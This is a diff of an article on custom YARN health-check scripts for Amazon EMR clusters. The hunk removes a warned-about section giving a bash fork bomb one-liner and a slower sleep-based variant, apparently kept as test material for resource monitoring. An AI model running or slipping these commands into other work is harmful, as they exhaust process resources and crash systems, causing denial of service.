@@ -151,23 +151,3 @@ Furthermore, this approach can be extended to encompass security considerations.
 The flexibility of this solution lies in the ability to create custom scripts tailored to your specific monitoring requirements. Whether it's monitoring system resources, verifying application health, or ensuring adherence to security best practices, you can develop scripts that encapsulate the desired logic and seamlessly integrate them with YARN's health monitoring framework.
 
 By leveraging this approach, you gain a powerful and extensible mechanism to maintain the overall health and integrity of your Amazon EMR cluster. It empowers you to proactively identify and mitigate potential issues, optimize resource utilization, and enhance the resilience and security of your big data processing environment.
-
-# WARNING - These scripts / code examples can make your system unstable
-
-## Fork Bomb - DoS attack
-
-Use the second command to have a more gradual blast
-
-```
-# WARNING !! This is dangerous !!! Don't run it on a production system 
-# or in your personal computer if you're not ready to restart it
-# fork bomb - https://en.wikipedia.org/wiki/Fork_bomb
-:(){ :|: & };:
-```
-```
-fork() {
-sleep 5
-fork | fork &
-}
-fork
-```
